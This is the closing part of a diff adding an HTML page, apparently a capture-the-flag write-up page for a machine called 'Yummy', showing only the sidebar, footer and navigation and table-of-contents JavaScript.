+            <div class="toc-sidebar">
+                <h3>Contents</h3>
+                <ul id="toc-list">
+                    <!-- This will be populated by JavaScript -->
+                </ul>
+            </div>
+        </div>
+    </main>
+    
+    <!-- Mobile TOC toggle button -->
+    <button class="toc-toggle" aria-label="Toggle table of contents">
+        ≡
+    </button>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+        </div>
+    </footer>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
+    
+    <script>
+        // Machine metadata for sidebar population
+        let machineData = {};
+        
+        // Function to initialize the application
+        async function initializeApp() {
+            try {
+                // Fetch machine metadata
+                const response = await fetch('../machines.json');
+                if (!response.ok) {
+                    throw new Error('Failed to load machine metadata');
+                }
+                machineData = await response.json();
+                
+                // Populate the sidebar with machine links
+                populateSidebar();
+                
+                // Generate table of contents
+                generateTableOfContents();
+            } catch (error) {
+                console.error('Initialization error:', error);
+                showError("Failed to initialize application. Please refresh and try again.");
+            }
+        }
+
+        // Call the initialization function when the page loads
+        document.addEventListener('DOMContentLoaded', initializeApp);
+
+        // Populate sidebar with machine links dynamically
+        function populateSidebar() {
+            const categories = {
+                "easy": document.getElementById("easy-machines"),
+                "medium": document.getElementById("medium-machines"),
+                "hard": document.getElementById("hard-machines"),
+                "insane": document.getElementById("insane-machines")
+            };
+
+            // Clear existing links
+            for (const category of Object.values(categories)) {
+                category.innerHTML = '';
+            }
+
+            // Add machine links to appropriate categories
+            for (const [machineName, data] of Object.entries(machineData)) {
+                const difficulty = data.difficulty.toLowerCase();
+                if (categories[difficulty]) {
+                    const link = document.createElement('a');
+                    link.href = `../machines/${machineName}.html`;
+                    link.textContent = data.title;
+                    
+                    // Highlight current machine
+                    if (data.title === "Yummy") {
+                        link.classList.add('active');
+                    }
+                    
+                    categories[difficulty].appendChild(link);
+                }
+            }
+        }
+
+        // Generate table of contents from headings
+        function generateTableOfContents() {
+            const writeupBody = document.querySelector('.writeup-body');
+            const tocList = document.getElementById('toc-list');
+            const headings = writeupBody.querySelectorAll('h1, h2, h3');
+            
+            // Clear existing TOC
+            tocList.innerHTML = '';
+            
+            headings.forEach((heading, index) => {
+                // Create an ID for the heading if it doesn't have one
+                if (!heading.id) {
+                    // Convert heading text to kebab-case for ID
+                    const headingText = heading.textContent.trim();
+                    const headingId = headingText
+                        .toLowerCase()
+                        .replace(/[^\w\s-]/g, '')
+                        .replace(/\s+/g, '-');
+                    
+                    heading.id = headingId || `section-${index}`;
+                }
+                
+                // Create a list item for the TOC
+                const listItem = document.createElement('li');
+                const link = document.createElement('a');
+                link.href = `#${heading.id}`;
+                link.textContent = heading.textContent;
+                
+                // Add a class for h2 elements to create indentation
+                if (heading.tagName === 'H2') {
+                    listItem.classList.add('sub-heading');
+                    listItem.style.paddingLeft = '15px';
+                } else if (heading.tagName === 'H3') {
+                    listItem.classList.add('sub-sub-heading');
+                    listItem.style.paddingLeft = '30px';
+                }
+                
+                listItem.appendChild(link);
+                tocList.appendChild(listItem);
+            });
+            
+            // Set up scroll highlighting
+            setupScrollHighlighting();
+        }
+
+        // Highlight active TOC section on scroll
+        function setupScrollHighlighting() {
+            const tocLinks = document.querySelectorAll('.toc-sidebar a');
+            
+            function highlightActiveSection() {
+                // Find which section is currently in view
+                const fromTop = window.scrollY + 120;
+                
+                tocLinks.forEach(link => {
+                    const section = document.querySelector(link.hash);
+                    
+                    if (section && 
+                        section.offsetTop <= fromTop &&
+                        section.offsetTop + section.offsetHeight > fromTop) {
+                        link.classList.add('active');
+                    } else {
+                        link.classList.remove('active');
+                    }
+                });
+            }
+            
+            // Call initially and on scroll
+            window.addEventListener('scroll', highlightActiveSection);
+            highlightActiveSection();
+        }
+
+        // Show error message
+        function showError(message) {
+            const contentArea = document.querySelector('.writeup-body');
+            contentArea.innerHTML = `
+                <div class="error-message">
+                    <h2>Error</h2>
+                    <p>${message}</p>
+                </div>
+            `;
+        }
+
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Hamburger menu functionality
+            const hamburgerMenu = document.querySelector('.hamburger-menu');
+            const sidebar = document.querySelector('.sidebar');
+            const backdrop = document.querySelector('.backdrop');
+            
+            hamburgerMenu.addEventListener('click', () => {
+                hamburgerMenu.classList.toggle('active');
+                sidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            backdrop.addEventListener('click', () => {
+                hamburgerMenu.classList.remove('active');
+                sidebar.classList.remove('active');
+                backdrop.classList.remove('active');
+                tocSidebar.classList.remove('active');
+            });
+            
+            // Difficulty buttons functionality
+            const difficultyButtons = document.querySelectorAll('.difficulty-btn');
+            
+            difficultyButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const difficulty = button.getAttribute('data-difficulty');
+                    const machineList = document.querySelector(`#${difficulty}-machines`);
+                    
+                    machineList.classList.toggle('active');
+                });
+            });
+            
+            // Mobile TOC toggle
+            const tocToggle = document.querySelector('.toc-toggle');
+            const tocSidebar = document.querySelector('.toc-sidebar');
+            
+            tocToggle.addEventListener('click', () => {
+                tocSidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            // Close TOC sidebar when clicking on a link (mobile)
+            document.querySelectorAll('.toc-sidebar a').forEach(link => {
+                link.addEventListener('click', () => {
+                    if (window.innerWidth <= 1024) {
+                        tocSidebar.classList.remove('active');
+                        backdrop.classList.remove('active');
+                    }
+                });
+            });
+        });
+
+        // Add smooth scrolling for TOC links
+        document.addEventListener('click', function(e) {
+            if (e.target.tagName === 'A' && e.target.hash) {
+                const element = document.querySelector(e.target.hash);
+                if (element) {
+                    e.preventDefault();
+                    window.scrollTo({
+                        top: element.offsetTop - 90,
+                        behavior: 'smooth'
+                    });
+                }
+            }
+        });
+    </script>
+</body>
+</html>
